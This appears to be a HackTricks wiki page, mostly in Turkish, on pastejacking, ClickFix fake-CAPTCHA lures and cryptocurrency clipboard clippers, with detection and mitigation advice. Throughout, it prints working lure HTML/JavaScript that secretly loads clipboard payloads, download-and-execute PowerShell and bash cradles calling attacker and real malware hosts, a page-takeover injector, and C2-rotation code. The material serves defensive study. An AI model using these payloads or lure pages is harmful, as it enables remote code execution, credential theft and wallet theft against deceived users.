# Clipboard Hijacking (Pastejacking) Attacks

> "Kendinizin kopyalamadığı hiçbir şeyi asla yapıştırmayın." – eski ama hâlâ geçerli bir tavsiye

## Overview

Clipboard hijacking – *pastejacking* olarak da bilinir – kullanıcıların komutları incelemeden rutin olarak kopyalayıp yapıştırmasından yararlanır. Kötü amaçlı bir web sayfası (veya Electron ya da Desktop application gibi JavaScript destekli herhangi bir context), saldırgan tarafından kontrol edilen metni programatik olarak sistem clipboard'ına yerleştirir. Kurbanlar, genellikle dikkatle hazırlanmış social-engineering talimatlarıyla **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) tuşlarına basmaya veya bir terminal açıp clipboard içeriğini *yapıştırmaya* teşvik edilir ve böylece arbitrary commands hemen çalıştırılır.

**Hiçbir dosya indirilmediği ve hiçbir attachment açılmadığı** için bu teknik, attachment'ları, macro'ları veya doğrudan command execution'ı izleyen çoğu e-mail ve web-content security control'ünü bypass eder. Bu nedenle saldırı, NetSupport RAT, Latrodectus loader veya Lumma Stealer gibi commodity malware family'lerini dağıtan phishing campaign'lerinde popülerdir.<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

Başka bir **clipboard hijacking** varyantı hiçbir command paste etmez: kurbanın bir **cryptocurrency wallet address** kopyalamasını bekler, ardından paste işleminden hemen önce bunu sessizce saldırganın kontrolündeki başka bir adresle değiştirir. Bu yöntem, kullanıcılar genellikle yalnızca ilk/son karakterleri doğruladığından uzun wallet format'larına karşı özellikle etkilidir.<sup>[[8]](#references)</sup>

Yaygın gerçek dünya özellikleri:
- **Thin loader + nested payload**: görünür app/exe meşru bir trading veya "profit" tool'u gibi görünürken gerçek clipper bundle'ın daha derin bir bölümünde gizlenir (örneğin nested Rust payload başlatan bir .NET loader).
- **Regex-driven replacement**: malware `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` gibi string'leri veya genel **44-character Solana-like** string'leri eşleştirir ve bunları saldırgan wallet'larıyla değiştirir.
- **Wallet rotation at scale**: modern Windows samples, her theft sonrasında wallet reputation burn'ünü azaltmak için tek bir static address yerine currency başına **binlerce** replacement wallet içerebilir.<sup>[[8]](#references)</sup>

### Windows clipper flow

Yaygın bir implementation, **`AddClipboardFormatListener`** ile register edilmiş hidden window'dur. Her clipboard update'inde malware genellikle şunları çağırır:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → mevcut clipboard data'ya erişir.
- **`GetClipboardData`** → metni okur.
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string'ini saldırganın değeriyle değiştirir.

Clippers'ta sık görülen minimal hunting regex'leri:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
User-level persistence, impact için yeterlidir. Gözlemlenen kalıplardan biri:<sup>[[8]](#references)</sup>
- Payload'u **`%APPDATA%\silke\silke.exe`** konumuna kopyalama
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` altında bir **Startup-folder LNK** oluşturma

Detection fikirleri:
- Clipboard API'lerini sürekli çağırırken aynı zamanda `%APPDATA%` ve kullanıcının **Startup** klasörüne yazan işlemler.
- Yeni LNK/executable oluşturulmasının ardından wallet-address clipboard yeniden yazımları.
- Kullanılmayan çok sayıda dosya içeren arşivler veya fake-software paketleri ile iç içe bir binary'yi başlatan küçük bir launcher.

### macOS social-engineered quarantine kaldırma + LaunchAgent persistence

macOS'ta bazı campaign'ler bir **`unlocker.command`** helper'ı gönderir ve Gatekeeper uygulamanın hasarlı olduğunu veya unidentified developer tarafından geldiğini söylerse kurbana sağ tıklayıp → **Open** seçmesini söyler. Script yalnızca quarantine'i kaldırır ve yakındaki `.app` dosyasını başlatır:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Bu, **Gatekeeper exploit'i** değildir; Gatekeeper kararlarının `com.apple.quarantine` xattr'ına bağlı olmasından yararlanan **sosyal mühendislik tabanlı bir quarantine bypass** yöntemidir.<sup>[[8]](#references)</sup>

Çalıştırıldıktan sonra clipper, aşağıdakileri yazarak mevcut kullanıcı olarak kalıcılık sağlayabilir:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` ve `KeepAlive` içeren LaunchAgent

Yararlı bir savunma ayrıntısı, bazı örneklerin her ~30 saniyede bir LaunchAgent'ı ve wrapper'ı yeniden yazan **self-healing watchdog** uygulamasıdır. Çalışan process'i sonlandırmadan önce plist'i kaldırırsanız **malware** onu hemen yeniden oluşturabilir.<sup>[[8]](#references)</sup> Güvenli temizleme sırası:
1. Aktif clipper process'ini sonlandırın.
2. LaunchAgent plist'ini unload edin/silin.
3. `~/launch.sh` dosyasını ve kopyalanan payload'ı silin.

### Delivery note: sahte itibarın güç çarpanı olarak kullanılması

Bu ailede malware teknik olarak basit kalabilir; ağır işi **distribution layer** üstlenir: sahte GitHub star/fork'ları, SourceForge incelemeleri/indirmeleri, YouTube tutorial yorumları/izlenmeleri ve zararsız görünen VirusTotal yorumları/oyları, binary'nin çalıştırılmadan önce güvenilir görünmesini sağlamak için kullanılır.<sup>[[8]](#references)</sup>

## Zorunlu copy butonları ve gizli payload'lar (macOS one-liner'ları)

Bazı macOS infostealer'ları installer sitelerini (ör. Homebrew) klonlar ve kullanıcıların yalnızca görünen metni seçememesi için **“Copy” butonunun kullanılmasını zorunlu kılar**. Clipboard girdisi, eklenmiş bir Base64 payload'ıyla (ör. `...; echo <b64> | base64 -d | sh`) birlikte beklenen installer command'ını içerir; böylece tek bir paste her ikisini de çalıştırırken UI ek aşamayı gizler.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Eski kampanyalarda `document.execCommand('copy')` kullanılırken, yenileri asenkron **Clipboard API**'ye (`navigator.clipboard.writeText`) dayanır.<sup>[[2]](#references)</sup>

## ClickFix / ClearFake Akışı

1. Kullanıcı, typosquatting uygulanmış veya ele geçirilmiş bir siteyi ziyaret eder (ör. `docusign.sa[.]com`)
2. Enjekte edilmiş **ClearFake** JavaScript'i, Base64 ile kodlanmış bir PowerShell one-liner'ını sessizce panoya kaydeden `unsecuredCopyToClipboard()` yardımcı işlevini çağırır.
3. HTML talimatları kurbana şunları söyler: *“Sorunu çözmek için **Win + R** tuşlarına basın, komutu yapıştırın ve Enter'a basın.”*
4. `powershell.exe` çalışır ve meşru bir çalıştırılabilir dosyanın yanı sıra kötü amaçlı bir DLL içeren bir arşiv indirir (klasik DLL sideloading).
5. Loader, ek aşamaların şifresini çözer, shellcode enjekte eder ve persistence kurar (ör. scheduled task) – nihai olarak NetSupport RAT / Latrodectus / Lumma Stealer çalıştırır.<sup>[[1]](#references)</sup>

### Örnek NetSupport RAT Zinciri
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (meşru Java WebStart), `msvcp140.dll` için kendi dizininde arama yapar.
* Kötü amaçlı DLL, **GetProcAddress** ile API'leri dinamik olarak çözümler, **curl.exe** aracılığıyla iki binary (`data_3.bin`, `data_4.bin`) indirir, bunların şifresini dönen XOR anahtarı `"https://google.com/"` kullanarak çözer, nihai shellcode'u enjekte eder ve **client32.exe**'yi (NetSupport RAT) `C:\ProgramData\SecurityCheck_v1\` konumuna çıkarır.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** ile `la.txt` dosyasını indirir
2. **cscript.exe** içinde JScript downloader'ı çalıştırır
3. Bir MSI payload'ı alır → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### MSHTA üzerinden Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** çağrısı, `PartyContinued.exe` dosyasını indiren, `Boat.pst` (CAB) dosyasını çıkaran, `extrac32` ve dosya birleştirme yoluyla `AutoIt3.exe` dosyasını yeniden oluşturan ve son olarak tarayıcı kimlik bilgilerini `sumeriavgv.digital` adresine exfiltrate eden bir `.a3x` scriptini çalıştıran gizli bir PowerShell scripti başlatır.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Bazı ClickFix campaigns, file download işlemlerini tamamen atlar ve victim'ları WSH aracılığıyla JavaScript alıp çalıştıran, kalıcılık sağlayan ve C2'yi günlük olarak döndüren tek satırlık bir komutu yapıştırmaları için yönlendirir. Gözlemlenen chain örneği:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Temel özellikler
- Casual inspection'ı engellemek için çalışma zamanında tersine çevrilen obfuscated URL.
- JavaScript, bir Startup LNK (WScript/CScript) aracılığıyla kalıcılığını sağlar ve mevcut güne göre C2'yi seçerek hızlı domain rotasyonuna olanak tanır.<sup>[[3]](#references)</sup>

C2'leri tarihe göre döndürmek için kullanılan minimal JS parçası:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Bir sonraki aşamada genellikle persistence sağlayan ve bir RAT (ör. PureHVNC) indiren bir loader deploy edilir; bu loader çoğu zaman TLS'i hardcoded bir sertifikaya pinler ve trafiği parçalara böler.<sup>[[3]](#references)</sup>

Bu varyanta özgü Detection fikirleri
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (veya `cscript.exe`).
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` altında, `%TEMP%`/`%APPDATA%` altındaki bir JS path ile WScript/CScript'i çalıştıran LNK.
- `.split('').reverse().join('')` veya `eval(a.responseText)` içeren Registry/RunMRU ve command-line telemetry.
- Uzun command line'lar kullanmadan uzun script'leri aktarmak için büyük stdin payload'ları ile tekrarlanan `powershell -NoProfile -NonInteractive -Command -`.
- Daha sonra updater'ı andıran bir task/path altında (ör. `\GoogleSystem\GoogleUpdater`) `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` gibi LOLBins çalıştıran Scheduled Tasks.

Threat hunting
- Günlük olarak değişen C2 hostnameleri ve `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern'ini kullanan URL'ler.
- Clipboard write event'lerini, ardından Win+R ile paste edilmesini ve hemen sonrasında gerçekleşen `powershell.exe` execution'ını correlate edin.

Blue team'ler, pastejacking abuse'u tespit etmek için clipboard, process-creation ve registry telemetry'yi birleştirebilir:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`, **Win + R** komutlarının geçmişini tutar; olağandışı Base64 / obfuscated entry'leri arayın.
* **4688** Security Event ID'sinde `ParentImage` == `explorer.exe` ve `NewProcessName` değerinin { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } kümesinde olması.
* Şüpheli 4688 event'inden hemen önce `%LocalAppData%\Microsoft\Windows\WinX\` veya temporary folder'lar altında gerçekleşen file creation'lar için Event ID **4663**.
* EDR clipboard sensors (varsa) – `Clipboard Write` event'ini hemen ardından başlayan yeni bir PowerShell process'i ile correlate edin.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Son kampanyalar, kullanıcıları OS-specific command'ları clipboard'larından native console'lara kopyalamaya zorlayan sahte CDN/browser verification pages ("Just a moment…", IUAM-style) üretmektedir. Bu yöntem execution'ı browser sandbox dışına taşır ve Windows ile macOS'ta çalışır.<sup>[[4]](#references)</sup>

Builder-generated pages'in temel özellikleri
- Payload'ları uyarlamak için `navigator.userAgent` üzerinden OS detection (Windows PowerShell/CMD ile macOS Terminal arasında seçim). İllüzyonu sürdürmek için desteklenmeyen OS'lar için optional decoy/no-op'lar.
- Zararsız UI actions (checkbox/Copy) sırasında automatic clipboard-copy; görünür text clipboard content'inden farklı olabilir.
- Mobile blocking ve adım adım talimatlar içeren bir popover: Windows → Win+R→paste→Enter; macOS → Terminal'i aç→paste→Enter.
- Tailwind-styled verification UI ile ele geçirilmiş bir sitenin DOM'unu overwrite etmek için optional obfuscation ve single-file injector (yeni domain registration gerekmez).<sup>[[4]](#references)</sup>

Örnek: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence of the initial run
- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` so execution continues after the terminal closes, reducing visible artifacts.<sup>[[4]](#references)</sup>

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM-style lures'a özgü tespit ve hunting fikirleri
- Web: Clipboard API'yi doğrulama widget'larına bağlayan sayfalar; görüntülenen metin ile clipboard payload'ı arasındaki uyumsuzluk; `navigator.userAgent` dallanması; şüpheli bağlamlarda Tailwind + single-page replace.
- Windows endpoint: Bir browser etkileşiminden kısa süre sonra `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%` konumundan çalıştırılan batch/MSI installer'ları.
- macOS endpoint: Browser olaylarının yakınında Terminal/iTerm'in `bash`/`curl`/`base64 -d` süreçlerini `nohup` ile başlatması; terminal kapatıldıktan sonra yaşamaya devam eden background job'lar.
- `RunMRU` Win+R geçmişi ve clipboard yazma işlemlerini, ardından oluşturulan console process'leriyle ilişkilendirin.

Destekleyici teknikler için ayrıca bakın

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 sahte CAPTCHA / ClickFix evrimleri (ClearFake, Scarlet Goldfinch)

- ClearFake, WordPress sitelerini compromise etmeye ve harici host'ları (Cloudflare Workers, GitHub/jsDelivr) birbirine zincirleyen loader JavaScript'leri inject etmeye devam ediyor; ayrıca güncel lure mantığını çekmek için blockchain “etherhiding” çağrılarını (ör. `bsc-testnet.drpc[.]org` gibi Binance Smart Chain API endpoint'lerine POST'lar) dahi kullanıyor. Güncel overlay'ler, herhangi bir şey download etmek yerine kullanıcıları tek satırlık bir komutu copy/paste etmeye (T1204.004) yönlendiren sahte CAPTCHA'ları yoğun biçimde kullanıyor.<sup>[[6]](#references)</sup>
- Initial execution giderek signed script host'lara/LOLBAS'a devrediliyor. Ocak 2026 zincirlerinde, daha önceki `mshta` kullanımı yerine `WScript.exe` aracılığıyla çalıştırılan yerleşik `SyncAppvPublishingServer.vbs` kullanıldı; remote content çekmek için alias/wildcard içeren PowerShell benzeri argümanlar geçirildi:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` imzalıdır ve normalde App-V tarafından kullanılır; `WScript.exe` ve alışılmadık argümanlarla (`gal`/`gcm` alias'ları, wildcard içeren cmdlet'ler, jsDelivr URL'leri) birlikte kullanıldığında ClearFake için yüksek sinyalli bir LOLBAS aşamasına dönüşür.<sup>[[6]](#references)</sup>
- Şubat 2026'da sahte CAPTCHA payload'ları yeniden saf PowerShell download cradle'larına kaydı. İki canlı örnek:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- İlk zincir bellek içi bir `iex(irm ...)` grabber'dır; ikinci zincir `WinHttp.WinHttpRequest.5.1` üzerinden stage eder, geçici bir `.ps1` dosyası yazar ve ardından gizli bir pencerede `-ep bypass` ile çalıştırır.<sup>[[6]](#references)</sup>

Bu varyantlar için tespit/arama ipuçları
- Process lineage: tarayıcı → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` veya clipboard yazma/Win+R işlemlerinin hemen ardından PowerShell cradles.
- Command-line anahtar kelimeleri: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domain'leri veya ham IP `iex(irm ...)` pattern'leri.
- Network: web browsing sonrasında script host'ları/PowerShell'den CDN worker host'larına veya blockchain RPC endpoint'lerine yapılan outbound bağlantılar.
- File/registry: `%TEMP%` altında geçici `.ps1` oluşturulması ve bu one-liner'ları içeren RunMRU kayıtları; signed-script LOLBAS'ların (WScript/cscript/mshta) external URL'ler veya obfuscated alias string'leriyle çalıştırılmasını block/alert et.

## Haziran 2026 ClickFix tradecraft'i: paste telemetry, fake verification comments ve LOLBin chaining

Recent Red Canary telemetry, stable indicator'ın **tek bir exact command olmadığını**, bunun yerine **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval** ve **immediate execution** kombinasyonu olduğunu gösteriyor.<sup>[[7]](#references)</sup>

### Dikkat çeken operator pattern'leri

- **Paste confirmation telemetry**: bazı payload'lar gerçek stage'den önce `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` çağrısı yapar. Bu, pencereyi kısa ve sessiz tutarken user interaction'ı doğrular.
- **Fake verification comments**: PowerShell one-liner'ları, Run / `cmd.exe` / PowerShell history'ye paste edildikten sonra command'ın hâlâ CAPTCHA ile ilgili görünmesi için `# Security check ✔️ I'm not a robot Verification ID: 138105` gibi string'ler ekleyebilir.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` command line'da static bir URL bulunmasını önlerken in-memory download-and-execute işlemini sürdürür.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q`, hâlâ `msiexec.exe`'ye benzerken brittle detection'ları bozmak için flag'lerde unusual casing ve Unicode-like karakterleri abuse eder.
- **Caret-escaped LOLBin chains**: `cmd.exe`, `^` escape'leriyle (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`) keyword'leri gizleyebilir, nested shell'i minimized olarak başlatabilir, attacker content'ini `.pdf` gibi benign bir extension ile kaydedebilir ve ardından bunu `mshta` üzerinden execute edebilir.<sup>[[7]](#references)</sup>
## Önlemler

1. Browser hardening – clipboard write-access'i (`dom.events.asyncClipboard.clipboardItem` vb.) disable edin veya user gesture gerektirin.
2. Security awareness – kullanıcılara sensitive command'ları *type* etmeyi veya önce bir text editor'e paste etmeyi öğretin.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control kullanarak arbitrary one-liner'ları block edin.
4. Network controls – bilinen pastejacking ve malware C2 domain'lerine yapılan outbound request'leri block edin.

## İlgili Tricks

* **Discord Invite Hijacking**, kullanıcıları malicious bir server'a çekiştirdikten sonra sıklıkla aynı ClickFix yaklaşımını abuse eder:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [ClickFix'i Önleme: ClickFix Attack Vector'ını Engelleme](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Pure Curtain Altında: RAT'ten Builder'a, Coder'a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [The ClickFix Factory: IUAM ClickFix Generator'ının İlk Kez Ortaya Çıkarılması](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, Infostealer yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: Şubat 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: Haziran 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Stars'tan Upvote'lara: Bir Crypto Clipboard Hijacker'ını Besleyen Fake Reputation](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
